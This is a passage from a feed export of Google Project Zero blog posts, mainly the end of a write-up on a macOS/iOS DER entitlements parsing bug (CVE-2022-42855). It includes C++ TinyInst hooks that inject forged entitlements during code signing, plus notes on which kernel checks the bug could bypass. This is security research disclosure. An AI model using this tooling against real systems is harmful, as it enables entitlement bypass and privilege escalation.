 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">ReadEntitlementsFile</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; std</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">ifstream file</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;entitlements.der&quot;</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;std</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">ios</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">binary </span><span class="wUhACgDjbS-c0">|</span><span class="wUhACgDjbS-c5">&nbsp;std</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">ios</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">ate</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">if</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">file</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5">fail</span><span class="wUhACgDjbS-c0">())</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; FATAL</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;Error reading entitlements file&quot;</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; der_size </span><span class="wUhACgDjbS-c0">=</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">size_t</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">file</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5">tellg</span><span class="wUhACgDjbS-c0">();</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; file</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5">seekg</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">0</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;std</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">ios</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5">beg</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; der </span><span class="wUhACgDjbS-c0">=</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">char</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">*)</span><span class="wUhACgDjbS-c5">malloc</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">der_size</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; file</span><span class="wUhACgDjbS-c0">.</span><span class="wUhACgDjbS-c5">read</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">der</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;der_size</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESizeSerializationHook</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnFunctionEntered</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// 3rd argument (output) is a pointer to the size</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; printf</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;In CESizeSerialization\n&quot;</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; size_t out_addr </span><span class="wUhACgDjbS-c0">=</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">GetArg</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">2</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">RemoteWrite</span><span class="wUhACgDjbS-c0">((</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c0">*)</span><span class="wUhACgDjbS-c5">out_addr</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">&amp;</span><span class="wUhACgDjbS-c5">der_size</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">sizeof</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">der_size</span><span class="wUhACgDjbS-c0">));</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">SetReturnValue</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">kCENoError</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESerializeWithOptionsHook</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnFunctionEntered</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// 5th argument points to output buffer</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; printf</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;In CESerializeWithOptions\n&quot;</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; size_t out_addr </span><span class="wUhACgDjbS-c0">=</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">GetArg</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c24">4</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">RemoteWrite</span><span class="wUhACgDjbS-c0">((</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c0">*)</span><span class="wUhACgDjbS-c5">out_addr</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;der</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;der_size</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">SetReturnValue</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">kCENoError</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CEInst</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CEInst</span><span class="wUhACgDjbS-c0">()</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">ReadEntitlementsFile</span><span class="wUhACgDjbS-c0">();</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">RegisterHook</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">new</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESizeSerializationHook</span><span class="wUhACgDjbS-c0">());</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">RegisterHook</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">new</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CESerializeWithOptionsHook</span><span class="wUhACgDjbS-c0">());</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c7"><span class="wUhACgDjbS-c11 wUhACgDjbS-c5"></span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">CEInst</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnModuleLoaded</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c0">*</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">module</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">char</span><span class="wUhACgDjbS-c0">*</span><span class="wUhACgDjbS-c5">&nbsp;module_name</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">if</span><span class="wUhACgDjbS-c0">(!</span><span class="wUhACgDjbS-c5">strcmp</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">module_name</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c3">&quot;libCoreEntitlements.dylib&quot;</span><span class="wUhACgDjbS-c0">))</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">{</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// we must get the value of kCENoError,</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c28">// which is libCoreEntitlements return value in case no error</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; size_t kCENoError_addr </span><span class="wUhACgDjbS-c0">=</span><span class="wUhACgDjbS-c11 wUhACgDjbS-c5">&nbsp;</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;(</span><span class="wUhACgDjbS-c5">size_t</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">GetSymbolAddress</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">module</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">char</span><span class="wUhACgDjbS-c0">*)</span><span class="wUhACgDjbS-c3">&quot;_kCENoError&quot;</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">if</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">(!</span><span class="wUhACgDjbS-c5">kCENoError_addr</span><span class="wUhACgDjbS-c0">)</span><span class="wUhACgDjbS-c5">&nbsp;FATAL</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c3">&quot;Error resolving symbol&quot;</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; &nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">RemoteRead</span><span class="wUhACgDjbS-c0">((</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">void</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">*)</span><span class="wUhACgDjbS-c5">kCENoError_addr</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c0">&amp;</span><span class="wUhACgDjbS-c5">kCENoError</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">sizeof</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5">kCENoError</span><span class="wUhACgDjbS-c0">));</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c0">}</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c5">&nbsp; </span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">TinyInst</span><span class="wUhACgDjbS-c0">::</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c8">OnModuleLoaded</span><span class="wUhACgDjbS-c0">(</span><span class="wUhACgDjbS-c5 wUhACgDjbS-c17">module</span><span class="wUhACgDjbS-c0">,</span><span class="wUhACgDjbS-c5">&nbsp;module_name</span><span class="wUhACgDjbS-c0">);</span></p>
 <p class="wUhACgDjbS-c10"><span class="wUhACgDjbS-c0">}</span></p></td></tr></table>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>HookReplace (base class for our 2 hooks) is a helper class used to completely replace the function implementation with the hook. </span><span class="wUhACgDjbS-c4">CESizeSerializationHook::OnFunctionEntered()</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">CESerializeWithOptionsHook::OnFunctionEntered()</span><span>&nbsp;are the bodies of the hooks. Additional code is needed to read the replacement entitlement DER and also to retrieve the value of kCENoError, which is a value libCoreEntitlements functions return on success and that we must return from our hooked versions. Note that, on macOS Monterey, </span><span class="wUhACgDjbS-c4">CESerializeWithOptions</span><span>&nbsp;should be replaced with </span><span class="wUhACgDjbS-c4">CESerialize</span><span class="wUhACgDjbS-c6">&nbsp;and the 3rd argument will be the output address rather than 4th.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">So, with that in place, I could sign a binary using DER provided in the entitlements.der file.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Now, with the tooling in place, the question becomes, how to exploit it. Or rather, which entitlement to target. In order to exploit the issue, we need to find an entitlement check that is ultimately made using </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span class="wUhACgDjbS-c6">&nbsp;API. Unfortunately, that rules out most userspace daemons - all the ones I looked at still did entitlement checking the &ldquo;old way&rdquo;, by first obtaining a dictionary representation of entitlements. That leaves &ldquo;just&rdquo; the entitlement checks done by the OS kernel.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Fortunately, a lot of checks in the kernel are made using the vulnerable API. Some of these checks are done by </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity</span><span>&nbsp;itself using functions like </span><span class="wUhACgDjbS-c4">OSEntitlements::queryEntitlementsFor</span><span>, </span><span class="wUhACgDjbS-c4">AppleMobileFileIntegrity::AMFIEntitlementGetBool</span><span>&nbsp;or </span><span class="wUhACgDjbS-c4">proc_has_entitlement</span><span>. But there are other APIs as well. For example, the </span><span class="wUhACgDjbS-c4">IOTaskHasEntitlement</span><span>&nbsp;and </span><span class="wUhACgDjbS-c4">IOCurrentTaskHasEntitlement</span><span>&nbsp;functions that are used from over a hundred places in the kernel (according to macOS Monterey kernel cache) end up calling </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span>&nbsp;(by first calling </span><span class="wUhACgDjbS-c4">amfi-&gt;OSEntitlements_query()</span><span class="wUhACgDjbS-c6">).</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>One other potentially vulnerable API was </span><span class="wUhACgDjbS-c4">IOUserClient::copyClientEntitlement</span><span>, but only on Apple silicon, where </span><span class="wUhACgDjbS-c4">pmap_cs_enabled()</span><span>&nbsp;is true. Although I didn&rsquo;t test this, </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://github.com/apple-oss-distributions/xnu/blob/e7776783b89a353188416a9a346c6cdb4928faad/iokit/Kernel/IOUserClient.cpp#L1480">there is some indication</a></span><span>&nbsp;that in that case the </span><span class="wUhACgDjbS-c4">CEContextQuery</span><span>&nbsp;API or something similar to it is used. </span><span class="wUhACgDjbS-c4">IOUserClient::copyClientEntitlement</span><span class="wUhACgDjbS-c6">&nbsp;is most notably used by device drivers to check entitlements.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>I attempted to exploit the issue on both macOS and iOS. On macOS, I found places where such an entitlement bypass could be used to unlock previously unreachable attack surfaces, but nothing that would immediately provide a stand-alone exploit. In the end, to report something while looking for a better primitive, I </span><span class="wUhACgDjbS-c15"><a class="wUhACgDjbS-c181" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2376">reported</a></span><span>&nbsp;that I was able to invoke functionality of the </span><span class="wUhACgDjbS-c4">kext_request</span><span class="wUhACgDjbS-c6">&nbsp;API (kernel extension API) that I normally shouldn&rsquo;t be able to do, even as the root user. At the time, I did my testing on macOS Monterey, versions 12.6 and 12.6.1.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">On iOS, exploiting such an issue would potentially be more interesting, as it could be used as part of a jailbreak. I was experimenting with iOS 16.1 and nothing I tried seemed to work, but due to the lack of introspection on the iOS platform I couldn&rsquo;t figure out why at the time.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">That is, until I received a reply from Apple on my macOS report, asking me if I can reproduce on macOS Ventura. macOS Ventura was just released in the same week when I sent my report to Apple and I was hesitant to upgrade to a new major version while having a working setup on macOS Monterey. But indeed, when I upgraded to Ventura, and after making sure my tooling still works, the DER issue wouldn&rsquo;t reproduce anymore. This was likely also the reason all of my iOS experiments were unsuccessful: iOS 16 shares the codebase with macOS Ventura.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>It appears that the issue was fixed due to refactoring and not as a security issue (macOS Monterey would be updated in this case as well as Apple releases some security patches not just for the latest major version of macOS, but also for the two previous ones). Looking at the code, it appears the API </span><span class="wUhACgDjbS-c4">libCoreEntitlements</span><span>&nbsp;uses to do low-level DER parsing has changed somewhat - on macOS Monterey, </span><span class="wUhACgDjbS-c4">libCoreEntitlements</span><span>&nbsp;used mostly </span><span class="wUhACgDjbS-c4">ccder_decode</span><span>* functions to interact with DER, while on macOS ventura </span><span class="wUhACgDjbS-c4">ccder_blob_decode</span><span>* functions are used more often. The latter additionally take the parent DER structure as input and thus make processing of hierarchical DER structure somewhat less error-prone. As a consequence of this change, </span><span class="wUhACgDjbS-c4">der_vm_execute_nocopy</span><span class="wUhACgDjbS-c6">&nbsp;continues processing the next key/value sequence after the end of the current one (which is the intended behavior) and not, as before, after the end of the value object. &nbsp;At this point, since I could no longer reproduce the issue on the latest OS release, I was no longer motivated to write the exploit and stopped my efforts in order to focus on other projects.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>Apple addressed the issue as CVE-2022-42855 on December 13, 2022. While Apple applied the CVE to all supported versions of their operating systems, including macOS Ventura and iOS 16, on those latest OS versions the patch seems to serve as an additional validation step. Specifically, on macOS Ventura, the patch is applied to function </span><span class="wUhACgDjbS-c4">der_decode_key_value</span><span class="wUhACgDjbS-c6">&nbsp;and makes sure that the key/value sequence does not contain other elements besides just key and the value (in other words, it makes sure that the length of the sequence matches length of key + value objects).</span></p><h2 class="wUhACgDjbS-c9" id="h.wim4vvikllfz"><span class="wUhACgDjbS-c11 wUhACgDjbS-c21">Conclusion</span></h2>
 <p class="wUhACgDjbS-c1"><span>It is difficult to claim that a particular code base has no vulnterabilities. While that might be possible for a </span><span class="wUhACgDjbS-c29">specific type</span><span>&nbsp;of vulnerabilities, it is difficult, and potentially impossible, to predict all types of vulnerabilities a complex codebase might have. After all, you can&rsquo;t reason about what you don&rsquo;t know.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c6">While DER encoding is certainly a much safer choice than XML when it comes to parsing logic issues, this blog post demonstrates that such issues are still possible even with the DER format.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span>And what about the SHA1 collision? While the identical prefix attack shouldn&rsquo;t work against DER, doesn&rsquo;t that still leave the chosen prefix attack? Maybe, but that&rsquo;s something to explore another time. Or maybe (hopefully) Apple will remove SHA1 support in their signature blobs and there will be nothing to explore at all.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/3562308922263769538/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/01/der-entitlements-brief-return-of.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3562308922263769538
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/3562308922263769538
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/01/der-entitlements-brief-return-of.html
## @title
DER Entitlements: The (Brief) Return of the Psychic Paper
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s72-c/image2.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-2515628030502752973
## published
08/12/2022 16:04:00
## updated
08/12/2022 16:04:18
## title
## @type
text
## #text
Exploiting CVE-2022-42703 - Bringing back the stack attack
## content
## @type
html
## #text
<p><span style="font-family: Arial; font-size: 11pt; font-style: italic; white-space: pre-wrap;">Seth Jenkins, Project Zero</span></p><span id="docs-internal-guid-80db8a65-7fff-c0a2-2d4d-7a9f80d725d3"><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This blog post details an exploit for </span><a href="https://bugs.chromium.org/p/project-zero/issues/list?q=label:CVE-2022-42703" style="text-decoration-line: none;"><span style="color: green; font-family: Roboto, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">CVE-2022-42703</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> (P0 </span><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2351" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">issue 2351</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - Fixed 5 September 2022), a bug Jann Horn found in the Linux kernel's memory management (MM) subsystem that leads to a use-after-free on </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">struct anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">. As the bug is very complex (I certainly struggle to understand it!), a future blog post will describe the bug in full. For the time being, the </span><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2351" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">issue tracker entry</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">, </span><a href="https://lwn.net/Articles/383162/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">this LWN article</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> explaining what an </span><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">anon_vma</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> is and </span><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: 